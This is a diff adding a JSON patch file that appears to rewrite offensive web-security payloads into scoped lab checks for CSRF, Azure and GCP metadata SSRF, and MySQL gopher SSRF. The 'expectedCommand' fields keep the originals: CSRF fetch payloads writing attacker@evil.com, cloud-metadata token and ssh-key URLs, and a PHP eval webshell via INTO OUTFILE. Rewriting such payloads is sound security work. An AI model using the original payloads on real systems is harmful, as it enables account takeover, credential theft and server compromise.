@@ -1,0 +1,465 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "csrf-json",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "<script>\nfetch(\"http://target.com/api/update\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\"Content-Type\": \"text/plain\"},\n  body: JSON.stringify({email: \"attacker@evil.com\"})\n});\n</script>",
+          "command": "<script>fetch(\"https://{LAB_APP}/api/profile\",{method:\"POST\",credentials:\"include\",headers:{\"Content-Type\":\"text/plain\"},body:JSON.stringify({displayName:\"PAYLOADER-CSRF-MARKER\"})});</script>",
+          "title": {
+            "zh": "验证 text/plain 兼容解析",
+            "en": "Validate text/plain Compatibility Parsing"
+          },
+          "description": {
+            "zh": "从受控跨站页面向实验资料接口发送唯一标记，检查服务端是否把 text/plain 请求体继续解析为 JSON 并改变状态。",
+            "en": "Send one unique marker from a controlled cross-site page to the lab profile endpoint and determine whether the server parses a text/plain body as JSON and changes state."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 使用Flash发送JSON请求\n# 需要目标允许Content-Type: application/json\n# 配合Flash的跨域能力",
+          "command": "<form action=\"https://{LAB_APP}/api/profile-form\" method=\"POST\"><input name=\"displayName\" value=\"PAYLOADER-CSRF-MARKER\"><button type=\"submit\">Submit</button></form>",
+          "title": {
+            "zh": "验证 HTML 表单写入边界",
+            "en": "Validate the HTML Form Write Boundary"
+          },
+          "description": {
+            "zh": "使用标准跨站表单提交可回滚的资料标记，验证接口是否只凭环境 Cookie 接受状态变更。",
+            "en": "Submit a reversible profile marker with a standard cross-site form and verify whether the endpoint accepts a state change based only on ambient cookies."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 利用JSONP回调\n<script src=\"http://target.com/api/data?callback=attacker\"></script>\nfunction attacker(data) { console.log(data); }\n\n# 利用数组返回\n[{\"secret\": \"data\"}]\n<script>var data = [{\"secret\": \"data\"}];</script>",
+          "command": "<script>fetch(\"https://{LAB_APP}/api/profile\",{method:\"POST\",credentials:\"include\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({displayName:\"PAYLOADER-CSRF-MARKER\"})});</script>",
+          "title": {
+            "zh": "记录 application/json 预检对照",
+            "en": "Record the application/json Preflight Control"
+          },
+          "description": {
+            "zh": "以相同标记提交 application/json 请求，记录浏览器是否发起 OPTIONS 预检以及服务端是否错误放行，不把预检结果直接等同于 CSRF。",
+            "en": "Submit the same marker as application/json, record whether the browser sends an OPTIONS preflight and whether the server permits it, and do not equate the preflight result with CSRF."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 创建恶意SWF文件发送JSON请求\n# 编译ActionScript代码\n# 嵌入HTML页面",
+          "command": "<script>const body=new FormData();body.append(\"displayName\",\"PAYLOADER-CSRF-MARKER\");fetch(\"https://{LAB_APP}/api/profile-multipart\",{method:\"POST\",credentials:\"include\",body});</script>",
+          "title": {
+            "zh": "验证 multipart 表单兼容解析",
+            "en": "Validate multipart Form Compatibility Parsing"
+          },
+          "description": {
+            "zh": "使用浏览器生成的 multipart 请求写入同一可回滚标记，确认后端是否跨内容类型复用不安全的 JSON 绑定逻辑。",
+            "en": "Use a browser-generated multipart request to write the same reversible marker and determine whether the backend reuses unsafe JSON binding across content types."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 尝试不同的Content-Type\ntext/plain\napplication/x-www-form-urlencoded\napplication/x-www-form-urlencoded; charset=UTF-8",
+          "command": "curl -sS -i -X OPTIONS \"https://{LAB_APP}/api/profile\" -H \"Origin: https://{LAB_ORIGIN}\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: content-type\"",
+          "title": {
+            "zh": "记录 JSON 预检响应",
+            "en": "Record the JSON Preflight Response"
+          },
+          "description": {
+            "zh": "从命令行保存预检响应头作为 CORS 配置证据；该请求不携带浏览器会话，也不能单独确认或排除 CSRF。",
+            "en": "Preserve preflight response headers as CORS configuration evidence; this command-line request has no browser session and cannot confirm or exclude CSRF by itself."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "let formData = new FormData();\nformData.append(\"data\", JSON.stringify({email: \"attacker@evil.com\"}));\nfetch(url, {method: \"POST\", body: formData, credentials: \"include\"});",
+          "command": "curl -sS -i -X POST \"https://{LAB_APP}/api/profile\" -H \"Origin: https://{LAB_ORIGIN}\" -H \"Content-Type: text/plain\" --data-binary '{\"displayName\":\"PAYLOADER-CSRF-MARKER\"}'",
+          "title": {
+            "zh": "复测服务端来源与令牌校验",
+            "en": "Retest Server-Side Origin and Token Validation"
+          },
+          "description": {
+            "zh": "在无登录 Cookie 的对照请求中确认接口拒绝缺少会话绑定令牌或可信来源的写入，再用真实浏览器完成最终回归。",
+            "en": "Use a no-cookie control to confirm that the endpoint rejects writes lacking a session-bound token or trusted origin, then complete the final regression in a real browser."
+          },
+          "syntaxBreakdown": []
+        }
+      ]
+    },
+    {
+      "id": "csrf-flash",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 检查crossdomain.xml\nhttp://target.com/crossdomain.xml\n\n# 允许所有域\n<cross-domain-policy>\n<allow-access-from domain=\"*\"/>\n</cross-domain-policy>\n\n# 允许特定域\n<allow-access-from domain=\"*.target.com\"/>",
+          "command": "curl -sS -D crossdomain.headers -o crossdomain.xml \"https://{LAB_APP}/crossdomain.xml\"",
+          "title": {
+            "zh": "获取 crossdomain.xml",
+            "en": "Retrieve crossdomain.xml"
+          },
+          "description": {
+            "zh": "只读保存实验站点的 Flash 跨域策略和响应头，供离线核对允许域、允许头与缓存策略。",
+            "en": "Save the lab Flash cross-domain policy and response headers read-only for offline review of allowed domains, headers, and caching behavior."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "// ActionScript代码\npackage {\n  import flash.net.*;\n  public class CSRF {\n    public function CSRF() {\n      var req:URLRequest = new URLRequest(\"http://target.com/api/action\");\n      req.method = URLRequestMethod.POST;\n      req.data = \"param=value\";\n      req.requestHeaders.push(new URLRequestHeader(\"Content-Type\", \"application/json\"));\n      sendToURL(req);\n    }\n  }\n}",
+          "command": "curl -sS -D clientaccesspolicy.headers -o clientaccesspolicy.xml \"https://{LAB_APP}/clientaccesspolicy.xml\"",
+          "title": {
+            "zh": "获取 clientaccesspolicy.xml",
+            "en": "Retrieve clientaccesspolicy.xml"
+          },
+          "description": {
+            "zh": "保存可能遗留的 Silverlight/兼容策略文件，区分它与 Flash 策略并检查是否仍有客户端消费。",
+            "en": "Save a possible Silverlight or compatibility policy file, distinguish it from Flash policy, and determine whether any supported client still consumes it."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "// Flash可以发送任意Content-Type\nreq.requestHeaders.push(\n  new URLRequestHeader(\"Content-Type\", \"application/json\")\n);\nreq.data = JSON.stringify({email: \"attacker@evil.com\"});",
+          "command": "rg -n --glob \"*.swf\" --glob \"*.html\" --glob \"*.js\" \"crossdomain\\.xml|clientaccesspolicy\\.xml|application/x-shockwave-flash|\\.swf\" \"{LEGACY_WEB_ROOT}\"",
+          "title": {
+            "zh": "定位遗留资产引用",
+            "en": "Locate Legacy Asset References"
+          },
+          "description": {
+            "zh": "在已授权的本地代码副本中查找 SWF、策略文件和旧 MIME 引用，不下载或执行未知 Flash 内容。",
+            "en": "Search an authorized local code copy for SWF, policy-file, and legacy MIME references without downloading or running unknown Flash content."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "// Flash可以添加自定义Header\nreq.requestHeaders.push(\n  new URLRequestHeader(\"X-Custom-Header\", \"value\")\n);\n\n// 绕过某些Header验证",
+          "command": "curl -sS -I \"https://{LAB_APP}/assets/legacy.swf\"",
+          "title": {
+            "zh": "记录 SWF 资产响应头",
+            "en": "Record SWF Asset Response Headers"
+          },
+          "description": {
+            "zh": "仅请求实验 SWF 资产的响应头，记录状态、类型、缓存和安全头，不执行文件内容。",
+            "en": "Request only response headers for the lab SWF asset and record status, type, caching, and security headers without executing its content."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# Flash可以绕过CORS预检\n# 直接发送POST请求\n# 携带Cookie",
+          "command": "curl -sS -i \"https://{LAB_APP}/crossdomain.xml\" -H \"Origin: https://{LAB_ORIGIN}\"",
+          "title": {
+            "zh": "复测遗留策略退役状态",
+            "en": "Retest Legacy Policy Retirement"
+          },
+          "description": {
+            "zh": "修复后确认策略文件已移除或仅保留精确批准来源，并将结果与代理访问日志和资产清单对照。",
+            "en": "After remediation, confirm that the policy is removed or limited to exact approved origins, and compare the result with proxy access logs and the asset inventory."
+          },
+          "syntaxBreakdown": []
+        }
+      ]
+    },
+    {
+      "id": "ssrf-cloud-azure",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "http://169.254.169.254/metadata/instance?api-version=2021-02-01\n需要添加Header:\nMetadata: true",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata:true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"",
+          "title": {
+            "zh": "读取实例元数据根对象",
+            "en": "Read the Instance Metadata Root Object"
+          },
+          "description": {
+            "zh": "在自有 Azure 实验虚拟机上读取实例对象并保存最小字段，确认必需请求头与链路本地目标均受控。",
+            "en": "Read the instance object on an owned Azure lab VM and preserve minimal fields, confirming control of both the required header and link-local destination."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n返回Azure AD访问令牌",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/info?api-version=2019-11-01\"",
+          "title": {
+            "zh": "读取托管身份公开标识",
+            "en": "Read Managed-Identity Public Identifiers"
+          },
+          "description": {
+            "zh": "只读取托管身份标识信息以验证端点边界，不请求 OAuth 访问令牌，也不调用 Azure 管理 API。",
+            "en": "Read only managed-identity identifiers to validate the endpoint boundary without requesting an OAuth access token or calling an Azure management API."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01\n返回VM详细信息",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata:true\" \"http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01\"",
+          "title": {
+            "zh": "读取计算元数据对象",
+            "en": "Read the Compute Metadata Object"
+          },
+          "description": {
+            "zh": "获取实验虚拟机的计算元数据并限制保存范围，用于与 Azure 控制面资产记录进行一致性核对。",
+            "en": "Retrieve compute metadata for the lab VM with limited retention and compare it with the Azure control-plane asset record."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01\n返回网络配置信息",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata:true\" \"http://169.254.169.254/metadata/instance/network?api-version=2021-02-01\"",
+          "title": {
+            "zh": "读取网络元数据对象",
+            "en": "Read the Network Metadata Object"
+          },
+          "description": {
+            "zh": "读取实验虚拟机的网络元数据并仅保存验证所需地址，避免把响应扩展到其他资源或订阅。",
+            "en": "Read network metadata for the lab VM and preserve only addresses required for validation without expanding to other resources or subscriptions."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text\n返回用户自定义数据",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata:true\" \"http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text\"",
+          "title": {
+            "zh": "读取单个实例名称字段",
+            "en": "Read One Instance Name Field"
+          },
+          "description": {
+            "zh": "使用 format=text 只读取实例名称作为最小阳性证据，降低记录完整元数据对象带来的数据暴露。",
+            "en": "Use format=text to read only the instance name as minimal positive evidence and reduce exposure from retaining a complete metadata object."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "使用HTTP请求走私或重定向绕过Metadata头检查",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"; curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata:true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"",
+          "title": {
+            "zh": "对比缺失与存在 Metadata 头",
+            "en": "Compare Missing and Present Metadata Headers"
+          },
+          "description": {
+            "zh": "在同一实验虚拟机中对比无头与有头请求，证明服务端要求 Metadata:true，而不是把重定向或响应差异描述为绕过。",
+            "en": "Compare requests without and with Metadata:true on the same lab VM to prove the service requirement rather than describing a redirect or response difference as a bypass."
+          },
+          "syntaxBreakdown": []
+        }
+      ]
+    },
+    {
+      "id": "ssrf-cloud-gcp",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "http://metadata.google.internal/computeMetadata/v1/\n需要添加Header:\nMetadata-Flavor: Google",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/\"",
+          "title": {
+            "zh": "读取元数据根目录",
+            "en": "Read the Metadata Root Directory"
+          },
+          "description": {
+            "zh": "在自有 GCP 实验实例上读取元数据目录名称，不递归获取属性值或服务账号令牌。",
+            "en": "Read metadata directory names on an owned GCP lab instance without recursively retrieving attribute values or service-account tokens."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n返回OAuth访问令牌",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email\"",
+          "title": {
+            "zh": "读取服务账号邮箱标识",
+            "en": "Read the Service-Account Email Identifier"
+          },
+          "description": {
+            "zh": "只读取实验服务账号邮箱以确认端点边界，不请求 default/token，也不使用该身份访问其他 API。",
+            "en": "Read only the lab service-account email to validate the endpoint boundary without requesting default/token or using the identity against another API."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes\"",
+          "title": {
+            "zh": "读取服务账号作用域列表",
+            "en": "Read the Service-Account Scope List"
+          },
+          "description": {
+            "zh": "读取实验服务账号作用域名称并与项目基线比较，不获取凭据、令牌或资源数据。",
+            "en": "Read scope names for the lab service account and compare them with the project baseline without retrieving credentials, tokens, or resource data."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "http://metadata.google.internal/computeMetadata/v1/project/project-id\nhttp://metadata.google.internal/computeMetadata/v1/project/numeric-project-id",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/project/project-id\"",
+          "title": {
+            "zh": "读取实验项目标识",
+            "en": "Read the Lab Project Identifier"
+          },
+          "description": {
+            "zh": "只读取实验项目 ID 作为最小证据，并避免继续枚举组织、资源或其他项目。",
+            "en": "Read only the lab project ID as minimal evidence and avoid enumerating organizations, resources, or other projects."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys\nhttp://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/project/attributes/\"",
+          "title": {
+            "zh": "列出项目属性键名",
+            "en": "List Project Attribute Keys"
+          },
+          "description": {
+            "zh": "只列出实验项目属性键名，不读取 ssh-keys 或其他可能包含敏感配置的属性值。",
+            "en": "List only lab project attribute key names without reading ssh-keys or other attribute values that may contain sensitive configuration."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env\n获取Kubernetes环境变量",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/instance/attributes/\"",
+          "title": {
+            "zh": "列出实例属性键名",
+            "en": "List Instance Attribute Keys"
+          },
+          "description": {
+            "zh": "只列出实验实例属性键名，不读取 kube-env、启动脚本、SSH 密钥或其他属性内容。",
+            "en": "List only lab instance attribute key names without reading kube-env, startup scripts, SSH keys, or other attribute contents."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "http://169.254.169.254/computeMetadata/v1/\n使用内网IP代替域名",
+          "command": "curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/\"; curl -sS --max-time 3 --noproxy \"*\" -H \"Metadata-Flavor: Google\" \"http://169.254.169.254/computeMetadata/v1/\"",
+          "title": {
+            "zh": "对比主机名与链路本地地址",
+            "en": "Compare Hostname and Link-Local Address"
+          },
+          "description": {
+            "zh": "在同一实验实例中比较两个官方寻址形式，验证修复必须按最终连接地址分类，而不是只过滤主机字符串。",
+            "en": "Compare the two documented addressing forms on one lab instance to verify that remediation classifies the final connected address rather than filtering only a hostname string."
+          },
+          "syntaxBreakdown": []
+        }
+      ]
+    },
+    {
+      "id": "ssrf-mysql",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "MySQL通信协议:\n- 握手包\n- 认证包\n- 命令包\n需要构造符合协议的数据",
+          "command": "gopher://{LAB_MYSQL_HOST}:3306/_PAYLOADER_MYSQL_REACHABILITY%0D%0A",
+          "title": {
+            "zh": "发送 Gopher 无害标记",
+            "en": "Send a Harmless Gopher Marker"
+          },
+          "description": {
+            "zh": "让实验取回器向固定的字节记录监听器发送唯一文本标记，只验证 scheme 与端口可达性。",
+            "en": "Have the lab fetcher send one unique text marker to a fixed byte-recording listener, validating only scheme and port reachability."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 构造MySQL协议数据包\n# 需要使用工具生成\ngopher://127.0.0.1:3306/_[MySQL Protocol Data]\n\n# 使用sqlmap\ngopher://127.0.0.1:3306/_[sqlmap生成的payload]",
+          "command": "dict://{LAB_MYSQL_HOST}:3306/PAYLOADER_MYSQL_REACHABILITY",
+          "title": {
+            "zh": "验证 dict Scheme 端口边界",
+            "en": "Validate the dict Scheme Port Boundary"
+          },
+          "description": {
+            "zh": "使用同一隔离监听器测试 dict scheme 是否被允许连接 3306，不把返回字节解释为数据库响应。",
+            "en": "Use the same isolated listener to test whether the dict scheme can connect to port 3306 without interpreting returned bytes as a database response."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 使用Gopherus工具\npython gopherus.py --exploit mysql\n输入用户名和SQL命令\n生成Gopher URL\n\n# 或使用mysql_gopher_attack工具",
+          "command": "curl -sS --max-time 3 \"http://{LAB_SSRF_APP}/fetch?url=gopher%3A%2F%2F%7BLAB_MYSQL_HOST%7D%3A3306%2F_PAYLOADER_MYSQL_REACHABILITY%250D%250A\" -o mysql-gopher-result.json",
+          "title": {
+            "zh": "通过实验取回接口提交 Gopher URL",
+            "en": "Submit a Gopher URL Through the Lab Fetch Endpoint"
+          },
+          "description": {
+            "zh": "向专用实验取回接口提交编码后的固定主机 URL，保存结果和出站日志，不生成 MySQL 报文。",
+            "en": "Submit an encoded fixed-host URL to the dedicated lab fetch endpoint and preserve the result plus egress logs without generating MySQL packets."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "SELECT * FROM users;\nSELECT user(), version();\n写入WebShell:\nSELECT \"<?php @eval($_POST[cmd]);?>\" INTO OUTFILE \"/var/www/html/shell.php\";",
+          "command": "curl -sS --max-time 3 \"http://{LAB_SSRF_APP}/fetch?url=dict%3A%2F%2F%7BLAB_MYSQL_HOST%7D%3A3306%2FPAYLOADER_MYSQL_REACHABILITY\" -o mysql-dict-result.json",
+          "title": {
+            "zh": "通过实验取回接口提交 dict URL",
+            "en": "Submit a dict URL Through the Lab Fetch Endpoint"
+          },
+          "description": {
+            "zh": "以相同固定主机和唯一标记复测另一非 HTTP scheme，比较拒绝策略和最终连接证据。",
+            "en": "Retest another non-HTTP scheme with the same fixed host and unique marker, comparing rejection behavior and final-connection evidence."
+          },
+          "syntaxBreakdown": []
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "如果MySQL允许空密码连接\n可以更容易构造攻击载荷",
+          "command": "curl -sS --max-time 3 \"http://{LAB_SSRF_APP}/fetch?url=gopher%3A%2F%2F%7BLAB_MYSQL_HOST%7D%3A3306%2F_PAYLOADER_MYSQL_BLOCKED\" -o mysql-egress-regression.json",
+          "title": {
+            "zh": "复测非 HTTP Scheme 与数据库出口阻断",
+            "en": "Retest Non-HTTP Scheme and Database Egress Blocking"
+          },
+          "description": {
+            "zh": "修复后重放固定实验 URL，确认应用拒绝 gopher 或网络层阻断 3306，同时正常 HTTPS 取回仍可用。",
+            "en": "Replay the fixed lab URL after remediation to confirm that the application rejects gopher or the network blocks port 3306 while normal HTTPS fetching still works."
+          },
+          "syntaxBreakdown": []
+        }
+      ]
+    }
+  ]
+}
